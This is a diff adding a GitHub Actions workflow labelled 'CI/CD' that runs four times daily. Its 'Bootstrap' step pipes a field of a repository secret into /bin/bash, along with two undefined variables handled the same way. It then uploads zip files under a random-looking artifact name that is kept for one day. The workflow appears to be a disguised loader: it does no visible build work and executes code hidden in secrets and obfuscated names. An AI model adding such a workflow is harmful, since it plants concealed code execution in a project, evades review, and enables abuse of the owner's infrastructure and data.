@@ -1,0 +1,33 @@
+name: CI/CD
+on:
+  workflow_dispatch:
+
+  schedule:
+    - cron: '45 2,8,14,20 * * *'
+permissions:
+  contents: read
+  actions: read
+concurrency:
+  group: ${{ github.workflow }}
+  cancel-in-progress: false
+jobs:
+  deploy:
+    name: Main task
+    runs-on: ubuntu-latest
+    steps:
+      - name: Checkout
+        uses: actions/checkout@v4
+      - name: Bootstrap
+        env:
+          ve0: ${{ secrets.ve0 }}
+        run: |
+          printf '%s' "$ve0" | jq -r .kkeu550 | /bin/bash
+          printf '%s' "$afprs8361" | jq -r .sopv4337 | /bin/bash
+          printf '%s' "$id7" | jq -r .rujyk0 | /bin/bash
+
+      - name: Archive artifact
+        uses: actions/upload-artifact@v4
+        with:
+          name: B4dXO4vt
+          path: "*.zip"
+          retention-days: 1
